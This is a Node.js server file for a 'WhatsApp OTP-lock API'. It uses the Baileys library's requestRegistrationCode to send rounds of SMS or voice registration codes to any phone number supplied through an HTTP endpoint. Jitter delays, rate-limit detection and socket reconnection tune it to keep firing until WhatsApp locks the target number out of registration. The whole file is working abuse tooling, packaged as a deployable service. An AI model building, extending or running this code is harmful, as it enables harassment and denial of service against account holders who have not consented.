// server.mjs
// WhatsApp OTP-lock API — Baileys socket method (requestRegistrationCode).
// Language: JavaScript — Node 18+, ESM.
//
// GET /api?number=15551234567&key=SECRET[&mode=sms|voice|both][&rounds=4]
//
// Why this shape: WhatsApp's HTTP /v2/code endpoint requires e_skey_sig, a
// Curve25519 signature over an ephemeral pubkey that the native client
// generates and encrypts with a server pubkey. Without that crypto you get
// {reason: "missing_param", param: "e_skey_sig"} on every request.
//
// Baileys' `makeWASocket(...).requestRegistrationCode(phone, isVoice)`
// sends the same registration over the WhatsApp Web wss transport as a
// binary IQ node, with the ephemeral key material built in. The server
// accepts it and fires the SMS or voice OTP.
//
// Flow per job:
//   1. useMultiFileAuthState('/tmp/wa-reg-<uuid>')
//   2. makeWASocket({ auth, printQRInTerminal: false, ... })
//   3. wait for `connection.update: open` (or close — registration
//      sockets sometimes close immediately after handshake; either is fine)
//   4. loop shots: await sock.requestRegistrationCode(phone, isVoice)
//   5. sock.end(), rm auth dir
//
// Env: API_KEY, PORT, MIN_JITTER_MS, NUMBER_COOLDOWN_MS, SOCKET_TIMEOUT_MS

import express from 'express'
import pino from 'pino'
import makeWASocket, {
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  Browsers,
} from '@whiskeysockets/baileys'
import { randomUUID } from 'node:crypto'
import { setTimeout as sleep } from 'node:timers/promises'
import { rmSync } from 'node:fs'

// -- config ------------------------------------------------------------------

const PORT         = process.env.PORT || 3000
const API_KEY      = process.env.API_KEY
const MIN_JITTER   = Math.max(1000, Number(process.env.MIN_JITTER_MS || 6000))
const NUM_COOLDOWN = Math.max(0, Number(process.env.NUMBER_COOLDOWN_MS || 30 * 60 * 1000))
const SOCKET_TO    = Math.max(5000, Number(process.env.SOCKET_TIMEOUT_MS || 30000))
const MAX_ROUNDS   = 20

if (!API_KEY) {
  console.error('API_KEY env is required — refusing to start')
  process.exit(1)
}

const log = pino({ level: process.env.LOG_LEVEL || 'info' })

// -- state -------------------------------------------------------------------

const lastFired = new Map()

function pruneCooldowns() {
  const cutoff = Date.now() - NUM_COOLDOWN
  for (const [num, t] of lastFired) if (t < cutoff) lastFired.delete(num)
}

// -- socket lifecycle --------------------------------------------------------

// One socket per job. Baileys registration sockets talk to
// wss://web.whatsapp.com/ws/chat. They can close right after the handshake
// because we never authenticate — that's expected. The `requestRegistrationCode`
// IQ is sent on the transport while it's up; if it closes between shots we
// reconnect for the next one.

async function openSocket() {
  const dir = `/tmp/wa-reg-${randomUUID()}`
  const { state, saveCreds } = await useMultiFileAuthState(dir)
  const { version } = await fetchLatestBaileysVersion()

  const sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: 'silent' }),
    browser: Browsers.ubuntu('Chrome'),
    connectTimeoutMs: SOCKET_TO,
    defaultQueryTimeoutMs: SOCKET_TO,
    keepAliveIntervalMs: 15000,
  })
  sock.ev.on('creds.update', saveCreds)

  const open = await new Promise((resolve) => {
    const t = setTimeout(() => resolve(false), SOCKET_TO)
    sock.ev.on('connection.update', ({ connection }) => {
      if (connection === 'open')  { clearTimeout(t); resolve(true)  }
      if (connection === 'close') { clearTimeout(t); resolve(false) }
    })
  })

  const cleanup = () => {
    try { sock.end(undefined) } catch {}
    try { rmSync(dir, { recursive: true, force: true }) } catch {}
  }
  return { sock, open, cleanup }
}

// -- one shot ----------------------------------------------------------------

async function shot(sock, number, method) {
  // Baileys signature: requestRegistrationCode(phoneNumber, isVoice?)
  // The phone is E.164 digits without '+'.
  const isVoice = method === 'voice'
  return await sock.requestRegistrationCode(number, isVoice)
}

// -- job runner --------------------------------------------------------------

const pickMethod = (mode, round) => mode === 'both'
  ? (round % 2 === 0 ? 'voice' : 'sms')
  : mode

async function runLock({ number, mode, rounds, jitterMs }) {
  const effJitter = Math.max(jitterMs, MIN_JITTER)
  const shots = []
  let cooldownHit = false

  let { sock, open, cleanup } = await openSocket()
  log.info({ open }, 'socket opened')

  try {
    for (let i = 1; i <= rounds; i++) {
      const method = pickMethod(mode, i)
      const t0 = Date.now()
      try {
        const res = await shot(sock, number, method)
        shots.push({ round: i, method, ok: true, ms: Date.now() - t0, res: normalize(res) })
        lastFired.set(number, Date.now())

        // WhatsApp returns `too_recent` / `too_many` / `blocked` in the IQ reply.
        const flat = JSON.stringify(res).toLowerCase()
        if (/too_recent|too_many|blocked|rate|flood/.test(flat)) {
          cooldownHit = true
          break
        }
      } catch (err) {
        const msg = err?.message || String(err)
        shots.push({ round: i, method, ok: false, ms: Date.now() - t0, err: msg })

        // socket died mid-job — reconnect before the next shot
        if (/closed|timeout|not open|disconnect/i.test(msg) && i < rounds) {
          try { cleanup() } catch {}
          const next = await openSocket()
          sock = next.sock; open = next.open; cleanup = next.cleanup
          log.info({ open }, 'socket reopened')
        }

        if (/too_recent|too_many|blocked|rate|flood/i.test(msg)) {
          cooldownHit = true
          break
        }
      }
      if (i < rounds) await sleep(effJitter + Math.random() * effJitter)
    }
  } finally {
    cleanup()
  }

  const delivered = shots.filter(s => s.ok).length
  return { shots, delivered, errors: shots.length - delivered, cooldownHit, effectiveJitterMs: effJitter }
}

// Baileys responses can be BinaryNodes with Buffers — flatten for JSON.
function normalize(x) {
  try {
    return JSON.parse(JSON.stringify(x, (_k, v) =>
      v && v.type === 'Buffer' && Array.isArray(v.data) ? `<buf ${v.data.length}b>` : v))
  } catch { return String(x).slice(0, 200) }
}

// -- http --------------------------------------------------------------------

const app = express()
app.use((req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*')
  res.set('Access-Control-Allow-Headers', 'x-api-key, content-type')
  res.set('Access-Control-Allow-Methods', 'GET, OPTIONS')
  if (req.method === 'OPTIONS') return res.sendStatus(204)
  next()
})

app.get('/', (_req, res) => {
  pruneCooldowns()
  res.json({ ok: true, service: 'wa-otp-lock-api', surface: 'GET /api?number=', numbersInCooldown: lastFired.size })
})

app.get('/api', async (req, res) => {
  const key = req.query.key || req.get('x-api-key')
  if (key !== API_KEY) return res.status(401).json({ error: 'unauthorized' })

  const clean  = String(req.query.number || '').replace(/\D/g, '')
  const mode   = String(req.query.mode || 'sms').toLowerCase()
  const rounds = Math.min(Math.max(1, Number(req.query.rounds) || 4), MAX_ROUNDS)
  const jitter = Math.min(Math.max(MIN_JITTER, Number(req.query.jitter) || MIN_JITTER), 120000)

  if (!/^\d{7,15}$/.test(clean))
    return res.status(400).json({ error: 'number must be E.164 digits (7–15), no +' })
  if (!['sms', 'voice', 'both'].includes(mode))
    return res.status(400).json({ error: 'mode must be sms | voice | both' })

  pruneCooldowns()
  const last = lastFired.get(clean)
  if (last && Date.now() - last < NUM_COOLDOWN) {
    return res.status(429).json({
      error: 'number in cooldown',
      number: clean,
      remainMs: NUM_COOLDOWN - (Date.now() - last),
    })
  }

  const t0 = Date.now()
  try {
    const r = await runLock({ number: clean, mode, rounds, jitterMs: jitter })
    res.json({
      ok: r.delivered > 0,
      number: clean, mode,
      roundsRequested: rounds,
      delivered: r.delivered,
      errors: r.errors,
      cooldownHit: r.cooldownHit,
      elapsedMs: Date.now() - t0,
      shots: r.shots,
    })
  } catch (err) {
    res.status(500).json({ error: 'run failed', detail: err?.message || String(err) })
  }
})

app.listen(PORT, '0.0.0.0', () => log.info(`listening on 0.0.0.0:${PORT} — GET /api?number=`))
